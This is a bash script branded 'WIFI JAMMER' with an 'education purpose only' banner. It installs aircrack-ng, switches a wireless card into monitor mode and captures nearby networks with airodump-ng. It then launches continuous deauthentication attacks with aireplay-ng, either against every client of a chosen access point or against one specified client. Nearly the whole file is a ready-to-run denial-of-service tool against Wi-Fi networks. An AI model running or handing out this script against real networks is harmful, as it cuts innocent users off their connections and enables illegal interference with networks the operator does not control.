#!/bin/bash
RED="\e[31m"
CYAN="\e[36m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"
YEL="33"
YELL="\e[33m"
YELLOW="\e[33m"
ITALICYELLOW="\e[3;${YEL}m"
echo -e "${RED}"
echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  /"
echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\ "
echo ""
echo ""
echo "                                  WRITTEN BY                                "
echo ""
echo ""
echo "                               ,d                                            "
echo "                               88                                            "
echo "           88,dPYba,,adPYba, MM88MMM 88,dPYba,,adPYba,         8b,    ,d8 "
echo "           88P     88      8a  88     88P   88      8a  aaaaaaaa Y8, ,8P  "
echo "           88      88      88  88     88    88      88  aaaaaaaa  )888(   "
echo "           88      88      88  88,    88    88      88          ,d8   8b, "
echo "           88      88      88   Y888  88    88      88         8P       Y8"
echo ""
echo "                                    GitHub                               "
echo ""
echo -e "${ENDCOLOR}"
echo -e "${GREEN}"
echo "--------------------------------------------------------------------------------"
echo "----------------------Education purpose only for gods sake----------------------"
echo "--------------------------------Versio-3.0--------------------------------------"
echo -e "${ENDCOLOR}"

echo -e "${ITALICYELLOW}"

echo "--------------------------------------------------------------------------------"
echo "------------------------------------USAGE---------------------------------------"
echo "---                        Starts moniter interface                          ---"
echo "---                            Runs airodump-ng                              ---"
echo "---                     Deauthenticates whole Access point                   ---"
echo "---            Deauthenticates specified client of the Access point          ---"
echo "---                        revert make to managed mode                       ---"
echo "--------------------------------------------------------------------------------"
echo "------------------------------------NOTE----------------------------------------"
echo "---                             Use small y/n                                ---"
echo "--------------------------------------------------------------------------------"
echo "===========================Press enter to continue============================"
echo "=========================== Press ctrl + c to exit ============================"
echo -e "${ENDCOLOR}"
echo ""
read START
if [[ $START == "" ]]; then
clear
fi

# Function to print colored text
print_color_text() {
    local color="$1"
    local text="$2"
    echo -e "${color}${text}${ENDCOLOR}"
}

# Function to check if the script is run as root
check_root_permissions() {
    if [[ $EUID -ne 0 ]]; then
        print_color_text "$RED" "------------------------------------------------"
        print_color_text "$RED" "Ahhhh man run it with God damn root permission."
        print_color_text "$RED" "------------------------------------------------"
        exit 1
    fi
}


# Function to install a package if it's not already installed
install_package_if_missing() {
    local package_manager
    local update_command
    local install_command

    print_color_text "$YELLOW" "--------------------------------------------------------------------"
    print_color_text "$YELLOW" "Broo Im gonna check whether the necessary packages are installed ..."
    print_color_text "$YELLOW" "---------------------------------------------------------------------"
    sleep 2
    if command -v apt &>/dev/null; then
        package_manager="apt"
        update_command="sudo apt-get update"
        install_command="sudo apt-get install -y"
    elif command -v pacman &>/dev/null; then
        package_manager="pacman"
        update_command="sudo pacman -Sy"
        install_command="sudo pacman -S --noconfirm"

    else
        print_color_text "$RED" "----------------------------------------------------------"
        print_color_text "$RED" "Ahh shit Unsupported package manager. Byee Byee Ichigo..."
        print_color_text "$RED" "----------------------------------------------------------"
        exit 1
    fi



    local package_name="$1"
    if ! dpkg -s "$package_name" &>/dev/null && ! pacman -Q "$package_name" &>/dev/null; then
        print_color_text "$YELLOW" "------------------------------------"
        print_color_text "$YELLOW" "Installing required packages ..."
        print_color_text "$YELLOW" "------------------------------------"
        sleep 2
        $update_command
        sleep 2
        if ! $install_command "$package_name"; then
            print_color_text "$RED" "----------------------------------------------------------------"
            print_color_text "$RED" "Failed to install $package_name. Exiting...Some shit happended "
            print_color_text "$RED" "----------------------------------------------------------------"
            sleep 2
            clear
            exit 1
        fi
    else
        echo ""
        print_color_text "$RED" "------------------------------------------"
        print_color_text "$RED" "$package_name is already installed."
        print_color_text "$RED" "------------------------------------------"
        sleep 1
        clear
    fi
}


# Function to revert the wireless interface to managed mode
revert_to_managed_mode() {
    print_color_text "$YELLOW" "---------------------------------------------------------------------"
    print_color_text "$YELLOW" "Do you want to revert the wireless interface to managed mode? (y/n): "
    print_color_text "$YELLOW" "---------------------------------------------------------------------"
    read -r REVERT_OPTION

    if [[ $REVERT_OPTION == 'y' ]]; then
        print_color_text "$YELLOW" "-------------------------------------------------------------"
        print_color_text "$YELLOW" "Broo Reverting wireless interface to managed mode..."
        print_color_text "$YELLOW" "-------------------------------------------------------------"
        echo ""
        sleep 1
        if ! airmon-ng stop "$wire"; then
            print_color_text "$RED" "-----------------------------------------------------"
            print_color_text "$RED" "Failed to revert wireless interface to managed mode."
            print_color_text "$RED" "-----------------------------------------------------"
            exit 1
        fi
    fi
}


# Function to handle cleanup on script exit
cleanup() {
    print_color_text "$RED" "------------------------"
    print_color_text "$RED" "Cleaning up the shits."
    print_color_text "$RED" "------------------------"
    if [[ -n $airodump_pid ]]; then
        kill "$airodump_pid" &>/dev/null
    fi
    if [[ -n $deauth_pid ]]; then
        kill "$deauth_pid" &>/dev/null
    fi
    revert_to_managed_mode
    echo -e "${RED}"
    echo "  B)bbbb   Y)    yy E)eeeeee    B)bbbb   Y)    yy E)eeeeee "
    echo "  B)   bb   Y)  yy  E)          B)   bb   Y)  yy  E)       "
    echo "  B)bbbb     Y)yy   E)eeeee     B)bbbb     Y)yy   E)eeeee  "
    echo "  B)   bb     Y)    E)          B)   bb     Y)    E)       "
    echo "  B)    bb    Y)    E)          B)    bb    Y)    E)       "
    echo "  B)bbbbb     Y)    E)eeeeee    B)bbbbb     Y)    E)eeeeee "
    echo -e "${ENDCOLOR}"
    sleep 2
    exit 0
}






# Check for root permissions
check_root_permissions

# Check for required packages and install them if missing
required_packages=("aircrack-ng" "wireless-tools")
for package in "${required_packages[@]}"; do
    install_package_if_missing "$package"
done

# Function to start monitor interface
start_monitor() {
    iwconfig
    print_color_text "$YELLOW" "------------------------------------------------------"
    print_color_text "$YELLOW" "Yoo type the wireless interface from above: "
    print_color_text "$YELLOW" "------------------------------------------------------"
    read -r WIRELESS

    if [[ $WIRELESS == 'wlan0mon' || $WIRELESS == 'mon0' ]]; then
        wire=$WIRELESS
        function_mon
    elif [[ $WIRELESS == 'wlan0' ]]; then
        print_color_text "$YELLOW" "-----------------------------------------"
        print_color_text "$YELLOW" "Starting interface on $WIRELESS..."
        print_color_text "$YELLOW" "-----------------------------------------"
        sleep 1
        if ! airmon-ng start "$WIRELESS"; then
            print_color_text "$RED" "------------------------------------------------"
            print_color_text "$RED" "Oppps Failed to start monitor mode. Exiting..."
            print_color_text "$RED" "------------------------------------------------"
            exit 1
        fi
        sleep 4
        clear
        iwconfig
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        print_color_text "$YELLOW" "Yooo type the new wireless interface after starting monitor mode from above: "
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        read -r MONITOR
        wire=$MONITOR
        sleep 2
        function_mon
    else
        print_color_text "$RED" "----------------------------------------------"
        print_color_text "$RED" "Damnnn Invalid wireless interface. Exiting..."
        print_color_text "$RED" "----------------------------------------------"
        exit 1
    fi
}

# Function to perform monitoring and deauthentication
function_mon() {
    print_color_text "$CYAN" "-------------------------"
    print_color_text "$CYAN" "Starting monitoring..."
    print_color_text "$CYAN" "-------------------------"
    sleep 2
    print_color_text "$YELLOW" "---------------------------------------------------------------------------"
    print_color_text "$YELLOW" " Dumping network traffic. Wait for some moments (Press ctrl + c to stop)"
    print_color_text "$YELLOW" "---------------------------------------------------------------------------"
    sleep 1
    print_color_text "$YELLOW" "----------------------------------------------------------------------"
    print_color_text "$YELLOW" " Check dump.csv file in the same directory of the script if necessary "
    print_color_text "$YELLOW" "----------------------------------------------------------------------"

    # Set a trap to handle Ctrl+C (SIGINT) for airodump-ng
    trap  SIGINT

    # Run airodump-ng in the foreground
    airodump-ng -w dump --output-format csv $wire 


    # Once airodump-ng is terminated, reset the trap and continue
    trap - SIGINT

    echo ""
    sleep 1
    print_color_text "$YELLOW" "------------------"
    print_color_text "$YELLOW" " Please select: "
    print_color_text "$YELLOW" "------------------"
    print_color_text "$GREEN" "
                               1. Knock all the clients from the access point 
                               2. Knock a specific client from the access point
                               3. Skip"
    echo "Select [1,2,3]"
    read -r DEAUTH_OPTION
    trap cleanup SIGINT
    case $DEAUTH_OPTION in 
    
    1)  print_color_text "$YELLOW" "-------------------------------------------"
        print_color_text "$YELLOW" "Please enter the BSSID of the network: "
        print_color_text "$YELLOW" "-------------------------------------------"
        read -r BSSID
        sleep 1
        print_color_text "$YELLOW" "-------------------------------------------"
        print_color_text "$YELLOW" "Please enter the channel of the network: "
        print_color_text "$YELLOW" "-------------------------------------------"
        read -r CHANNEL

        # Set the channel
        iwconfig "$wire" channel "$CHANNEL"
        sleep 1

        # Launch deauthentication attack
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        print_color_text "$YELLOW" "Starting deauthentication attack on BSSID: $BSSID, Channel: $CHANNEL..."
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        sleep 2
        trap cleanup SIGINT
        aireplay-ng --deauth 0 -a "$BSSID" "$wire" &
        clear
        deauth_pid=$!
        # Wait for user to terminate deauth attack
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        print_color_text "$YELLOW" "Press Ctrl+C to stop the deauthentication attack and revert to managed mode..."
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        wait "$deauth_pid"
        cleanup
        ;;
   
    2)  print_color_text "$YELLOW" "-------------------------------------------"
        print_color_text "$YELLOW" "Please enter the BSSID of the network: "
        print_color_text "$YELLOW" "-------------------------------------------"
        read -r BSSID
        sleep 1
        print_color_text "$YELLOW" "-------------------------------------------"
        print_color_text "$YELLOW" "Please enter the channel of the network: "
        print_color_text "$YELLOW" "-------------------------------------------"
        read -r CHANNEL
        print_color_text "$YELLOW" "--------------------------------------------------"
        print_color_text "$YELLOW" "Please enter the station address of the client: "
        print_color_text "$YELLOW" "--------------------------------------------------"
        read -r STATION

        # Set the channel
        iwconfig "$wire" channel "$CHANNEL"
        sleep 1

        # Launch deauthentication attack
        print_color_text "$YELLOW" "---------------------------------------------------------------------------------------------"
        print_color_text "$YELLOW" "Starting deauthentication attack on Client: $STATION, BSSID: $BSSID , Channel: $CHANNEL..."
        print_color_text "$YELLOW" "----------------------------------------------------------------------------------------------"
        sleep 2
        trap cleanup SIGINT
        aireplay-ng --deauth 0 -a "$BSSID" -c $STATION "$wire" & #& for background process
        clear
        deauth_pid=$! #$! returns the process id of aireplay
        # Wait for user to terminate deauth attack
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        print_color_text "$YELLOW" "Press Ctrl+C to stop the deauthentication attack and revert to managed mode..."
        print_color_text "$YELLOW" "--------------------------------------------------------------------------------"
        wait "$deauth_pid"
        cleanup
    ;;


    3)  print_color_text "$RED" "-----------------------------------"
        print_color_text "$RED" "Skipping deauthentication attack."
        print_color_text "$RED" "-----------------------------------"
        cleanup
    ;;

    *) echo "Invalid entry" >&2
       cleanup
       ;;
       
    esac 
    
}

# Main script execution
clear
start_monitor

